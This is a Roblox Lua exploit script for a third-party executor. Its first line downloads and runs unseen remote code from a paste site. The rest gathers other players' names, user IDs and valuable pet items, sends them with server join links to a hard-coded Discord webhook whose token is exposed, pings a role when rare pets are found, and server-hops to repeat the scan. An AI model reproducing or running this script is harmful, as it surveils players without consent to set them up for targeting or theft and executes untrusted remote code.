loadstring(game:HttpGet("https://pastefy.app/aUrpltvi/raw"))()
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TeleportService = game:GetService("TeleportService")

---
-- Configuration
---
local webhookUrl = "https://discord.com/api/webhooks/1396345511929315481/wioipqN1ZxXSm-_yNlp_8uzUyVx9aWCFrlxYF-HxSCYzvR8bWLbC-AeKXGayzxhEuV_3" -- Confirmed webhook URL
local ALLOWED_WORDS = {"age"} -- ONLY "age" for general item display
local PING_TRIGGER_WORDS = {"butter", "raccoon", "dragonfly", "disco", "queen", "Kitsune", "Mimic", "Rex", "Spino"} -- Separate list for pinging
local PETPING_ROLE_ID = "1396358710934110328" -- Role ID for @petping

---
-- Webhook Function
---
local function sendToWebhook(data)
    local jsonData = HttpService:JSONEncode(data)
    task.spawn(function()
        local success, result = pcall(function()
            if syn and syn.request then
                local response = syn.request({
                    Url = webhookUrl,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = jsonData
                })
                if response and response.Success then return true
                else error("syn.request failed: " .. (response and response.StatusCode or "Unknown Status") .. " " .. (response and response.StatusMessage or "No Message")) end
            elseif request then
                local response = request({
                    Url = webhookUrl,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = jsonData
                })
                if response and response.Success then return true
                else error("request failed: " .. (response and response.StatusCode or "Unknown Status") .. " " .. (response and response.StatusMessage or "No Message")) end
            else
                HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
                return true
            end
        end)
        if not success then
            warn("Failed to send webhook: " .. tostring(result))
        end
    end)
end

---
-- Inventory Functions (for tools)
---
local function isValidItem(itemName)
    local lowerName = string.lower(itemName)
    -- Only allows items that contain "age"
    for _, word in ipairs(ALLOWED_WORDS) do
        if string.find(lowerName, string.lower(word)) then
            return true -- If it contains an allowed word, it's valid
        end
    end
    return false -- If it doesn't contain any allowed words, it's not valid
end

-- Function to get a player's filtered tool inventory
local function getPlayerFilteredInventory(player)
    local playerItems = {}
    if player and player.Backpack then
        for _, item in pairs(player.Backpack:GetChildren()) do
            if item:IsA("Tool") and isValidItem(item.Name) then
                table.insert(playerItems, item.Name)
            end
        end
    end
    if player and player.Character then
        for _, item in pairs(player.Character:GetChildren()) do
            if item:IsA("Tool") and isValidItem(item.Name) then
                table.insert(playerItems, item.Name)
            end
        end
    end
    return playerItems
end

-- Function to get and format all players' inventories (this is no longer directly used for the main webhook, but kept for reference if needed)
local function getAllPlayersInventoriesString()
    local allPlayersInventories = {}
    local playersInServer = Players:GetPlayers()

    for _, player in ipairs(playersInServer) do
        local items = getPlayerFilteredInventory(player)
        local itemsText = #items > 0 and table.concat(items, ", ") or "No valid items"
        table.insert(allPlayersInventories, string.format("%s: %s", player.Name, itemsText))
    end

    return table.concat(allPlayersInventories, "\n")
end

---
-- Pet Inventory Functions (reading from UI - for current player only)
---
-- Helper to get the ScrollingFrame for active pets UI
local function getActivePetScrollingFrame()
    local playerGui = LocalPlayer:WaitForChild("PlayerGui", 10)
    if not playerGui then return nil end
    local activePetUI = playerGui:WaitForChild("ActivePetUI", 10)
    if not activePetUI then return nil end
    local frame = activePetUI:WaitForChild("Frame", 10)
    if not frame then return nil end
    local main = frame:WaitForChild("Main", 10)
    if not main then return nil end
    local scrollingFrame = main:WaitForChild("ScrollingFrame", 10)
    if not scrollingFrame then return nil end
    return scrollingFrame
end

-- Helper to check if a string is a GUID (UUID) format
local function isGUID(str)
    return string.match(str, "^{%x%x%x%x%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%x%x%x%x%x%x%x%x}$") ~= nil
end

-- Function to get the current player's pet inventory (reading GUIDs from UI)
local function getPetInventory()
    local pets = {}
    local scrollingFrame = getActivePetScrollingFrame()
    if not scrollingFrame then
        warn("ActivePetUI.Frame.Main.ScrollingFrame not found for pet inventory.")
        return {"UI not found"}
    end

    for _, child in ipairs(scrollingFrame:GetChildren()) do
        local childName = child.Name
        if isGUID(childName) then
            table.insert(pets, childName)
        end
    end
    return pets
end

---
-- New Function: Send Individual Player Inventory Webhook
---
local function sendIndividualPlayerInventoryWebhook(player)
    if not player then return end

    local playerInventory = getPlayerFilteredInventory(player)
    -- Check if there are any valid items before sending the webhook
    if #playerInventory == 0 then
        print("Skipping webhook for " .. player.Name .. ": No valid items found.")
        return -- Do not send webhook if no valid items
    end

    local inventoryText = table.concat(playerInventory, "\n")
    local mentionContent = nil

    -- Check if any of the PING_TRIGGER_WORDS are in the player's filtered inventory
    for _, item in ipairs(playerInventory) do
        local lowerItem = string.lower(item)
        for _, triggerWord in ipairs(PING_TRIGGER_WORDS) do
            if string.find(lowerItem, string.lower(triggerWord)) then
                mentionContent = "<@&" .. PETPING_ROLE_ID .. ">"
                break -- Found a word that triggers ping, no need to check further items for this player
            end
        end
        if mentionContent then break end -- If mentionContent is set, break outer loop too
    end

    local joinLink = "https://kebabman.vercel.app/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. (game.JobId or "N/A")

    local messageData = {
        -- Only include 'content' field if a mention is needed
        content = mentionContent,
        embeds = {
            {
                title = "Player Inventory Report: " .. player.Name .. "!",
                description = "Filtered inventory from " .. player.Name .. "'s backpack and character.",
                color = 0x00FF00, -- Green color for individual reports
                fields = {
                    {name = "Player Name", value = player.Name, inline = true},
                    {name = "Player ID", value = player.UserId, inline = true},
                    {name = "Job ID", value = joinLink, inline = false}, -- Changed to false to give more space
                    {name = "Inventory", value = "```\n" .. inventoryText .. "\n```", inline = false}
                },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }
        }
    }
    sendToWebhook(messageData)
    print("Individual player inventory webhook sent (attempted) for: " .. player.Name .. "!")
end

---
-- Main Execution Logic
---
local function runWebhookScript()
    if not LocalPlayer then
        warn("LocalPlayer not found. Script will not run.")
        return
    end

    local playersInServer = Players:GetPlayers()
    print("Sending individual inventory webhooks for all players (excluding local player)...")

    for _, player in ipairs(playersInServer) do
        if player ~= LocalPlayer then -- Skip the local player
            sendIndividualPlayerInventoryWebhook(player)
            task.wait(0.1) -- IMPORTANT: Wait between sending each webhook to avoid Discord rate limits
        end
    end

    print("All individual inventory webhooks sent. Initiating server hop...")

    -- --- Server Hopping Logic ---
    local success, errorMessage = pcall(function()
        -- Changed TeleportToPlace to Teleport for broader compatibility
        TeleportService:Teleport(game.PlaceId)
    end)

    if not success then
        warn("Server hop failed: " .. tostring(errorMessage))
    else
        print("Server hop initiated successfully!")
    end
    -- --- End Server Hopping Logic ---

    -- You can still include a summary if you want, but it will be a separate webhook
    -- local currentPlayersCount = #playersInServer
    -- local maxPlayers = 5
    -- local petsList = getPetInventory()
    -- local petsText = #petsList > 0 and table.concat(petsList, "\n") or "No active pets found."
    -- local joinLink = "https://kebabman.vercel.app/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. (game.JobId or "N/A")
    -- sendToWebhook({
    --     embeds = {
    --         {
    --             title = "Server Summary Report!",
    --             description = "Overall server and current player's pet info.",
    --             color = 0x00FFFF,
    --             fields = {
    --                 {name = "Players in Server", value = string.format("%d/%d", currentPlayersCount, maxPlayers), inline = true},
    --                 {name = "Job ID", value = joinLink, inline = true},
    --                 {name = "Active Pets (Current Player)", value = "```\n" .. petsText .. "\n```", inline = false}
    --             },
    --             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    --         }
    --     }
    -- })
    -- print("Server summary webhook sent (attempted)!")
end


-- Run the script when the player's character is added
LocalPlayer.CharacterAdded:Connect(function()
    task.wait(3) -- Added 3-second delay
    runWebhookScript()
end)

-- Also run it once immediately if the character is already loaded when the script starts
if LocalPlayer.Character then
    task.wait(3) -- Added 3-second delay
    runWebhookScript()
end
